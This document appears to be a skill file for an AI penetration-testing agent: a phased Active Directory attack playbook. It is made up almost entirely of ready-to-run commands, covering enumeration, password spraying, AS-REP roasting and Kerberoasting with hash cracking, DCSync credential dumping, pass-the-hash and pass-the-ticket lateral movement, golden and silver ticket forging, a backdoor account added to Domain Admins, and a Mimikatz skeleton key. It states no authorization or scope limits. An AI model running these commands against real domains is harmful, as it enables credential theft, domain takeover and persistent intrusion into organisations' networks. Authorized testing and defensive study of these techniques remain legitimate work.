# Active Directory Attacks Skill

Active Directory enumeration, attacks, and exploitation.

## Trigger

Use when attacking Windows environments, Active Directory domains, SMB shares, or performing lateral movement in enterprise networks.

## Workflow

### Phase 1: Initial Enumeration

**Network Discovery**:
```bash
# Find domain controllers
nmap -p 53,88,135,139,389,445,464,636,3268,3269 -sV NETWORK/24

# SMB signing check
crackmapexec smb NETWORK/24 --gen-relay-list relay.txt
```

**Anonymous/Guest Access**:
```bash
# Enumerate shares
smbclient -L //DC_IP -N
smbmap -H DC_IP
smbmap -H DC_IP -u 'guest' -p ''

# RPC enumeration
rpcclient -U "" -N DC_IP
> enumdomusers
> enumdomgroups
> querydispinfo
```

**LDAP Enumeration** (if credentials available):
```bash
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'password' -b "dc=domain,dc=local"
```

### Phase 2: Credential Attacks

**Password Spraying**:
```bash
# CrackMapExec
crackmapexec smb DC_IP -u users.txt -p 'Password123' --continue-on-success

# Kerbrute
kerbrute passwordspray -d domain.local users.txt 'Password123'
```

**AS-REP Roasting** (no password required):
```bash
# Find accounts without pre-auth
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP
GetNPUsers.py domain.local/ -dc-ip DC_IP -request

# Crack hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Kerberoasting** (requires domain user):
```bash
# Request TGS tickets
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request

# Crack hashes
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Phase 3: Enumeration with Credentials

**BloodHound Collection**:
```bash
# Python collector
bloodhound-python -u 'user' -p 'password' -d domain.local -ns DC_IP -c All

# SharpHound (on Windows)
.\SharpHound.exe -c All
```

**CrackMapExec Enumeration**:
```bash
# User enumeration
crackmapexec smb DC_IP -u user -p password --users
crackmapexec smb DC_IP -u user -p password --groups

# Share enumeration
crackmapexec smb DC_IP -u user -p password --shares
crackmapexec smb DC_IP -u user -p password -M spider_plus

# Password policy
crackmapexec smb DC_IP -u user -p password --pass-pol
```

**Secrets Dumping**:
```bash
# DCSync (requires DA or replication rights)
secretsdump.py domain.local/admin:password@DC_IP

# SAM dump from share
secretsdump.py domain.local/admin:password@TARGET -just-dc-user krbtgt
```

### Phase 4: Lateral Movement

**Pass-the-Hash**:
```bash
# CrackMapExec
crackmapexec smb TARGET -u admin -H NTLM_HASH

# WMI execution
wmiexec.py -hashes :NTLM_HASH admin@TARGET

# PSExec
psexec.py -hashes :NTLM_HASH admin@TARGET

# SMBExec
smbexec.py -hashes :NTLM_HASH admin@TARGET
```

**Pass-the-Ticket**:
```bash
# Export ticket
export KRB5CCNAME=/path/to/ticket.ccache

# Use ticket
psexec.py -k -no-pass domain.local/admin@TARGET
```

**Evil-WinRM**:
```bash
evil-winrm -i TARGET -u admin -p password
evil-winrm -i TARGET -u admin -H NTLM_HASH
```

### Phase 5: Privilege Escalation

**DCSync Attack**:
```bash
secretsdump.py domain.local/admin:password@DC_IP -just-dc-ntlm
```

**Golden Ticket**:
```bash
# Get krbtgt hash first via DCSync
ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@DC_IP
```

**Silver Ticket**:
```bash
ticketer.py -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain domain.local -spn cifs/TARGET.domain.local user
```

### Phase 6: Persistence

**Creating Users**:
```bash
# Via RPC
net rpc user add backdoor Password123 -U admin%password -S DC_IP
net rpc group addmem "Domain Admins" backdoor -U admin%password -S DC_IP
```

**Skeleton Key** (in memory, requires DA):
```bash
# Mimikatz on DC
misc::skeleton
# Now any password works with master password "mimikatz"
```

## Tools Summary

| Tool | Purpose |
|------|---------|
| crackmapexec | Swiss army knife for AD |
| impacket | Python AD attack suite |
| bloodhound | AD visualization |
| responder | LLMNR/NBT-NS poisoning |
| evil-winrm | WinRM shell |
| kerbrute | Kerberos user enum |
| ldapsearch | LDAP queries |
| smbclient/smbmap | SMB enumeration |

## Record Findings

Use `record_finding` for:
- Kerberoastable accounts
- AS-REP roastable accounts
- Weak passwords found
- Admin access obtained
- Domain compromise achieved
- Credential dumping success
